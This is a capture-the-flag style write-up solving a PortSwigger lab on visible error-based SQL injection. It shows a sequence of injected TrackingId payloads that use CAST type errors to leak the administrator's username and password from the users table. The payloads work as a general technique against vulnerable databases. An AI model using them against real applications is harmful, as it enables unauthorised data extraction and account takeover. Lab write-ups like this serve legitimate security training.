https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

Lab objective: `Log in as the administrator user.`

The database contains a different table called `users`, with columns called `username` and `password`.

# Lab: Visible error-based SQL injection

1. For this query `TrackingId=91dZKqS8SFDON8r9'` we get the error massage `SELECT * FROM tracking WHERE id = '91dZKqS8SFDON8r9''` so we should remove the error by commenting out last `'` so the query will `TrackingId=91dZKqS8SFDON8r9'--`
2. New query will `TrackingId=91dZKqS8SFDON8r9' AND CAST((SELECT 1) as int)--` here `CAST()` will convert type (string to number, number to string).
3. Number 2 query will receive this error message `ERROR: argument of AND must be type boolean, not type integer Position: 63`. The mean `CAST((SELECT 1) as int)` this section is not boolean so we need to make the section boolean.
4. New query will `TrackingId=91dZKqS8SFDON8r9' AND 1=CAST((SELECT 1) as int)--` and it does not give me any error.
5. For finding username the query is `TrackingId=91dZKqS8SFDON8r9' AND 1=CAST((SELECT username FROM users) as int)--` but the error is `Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = '91dZKqS8SFDON8r9' AND 1=CAST((SELECT username FROM users) as'. Expected  char` From the error we see that query end before `int)--`. We estimated there have character limitation. 
6. So the new query will `TrackingId=' AND 1=CAST((SELECT username FROM users) as int)--` we remove TrackingId and get another error `ERROR: more than one row returned by a subquery used as an expression`
7. So the new query will `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--` and we get username form error `ERROR: invalid input syntax for type integer: "administrator"`
8. And password query will `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--` and password get by error `ERROR: invalid input syntax for type integer: "41r5a8xg35x3mt8iwqqi"`
9. Login and solve the lab.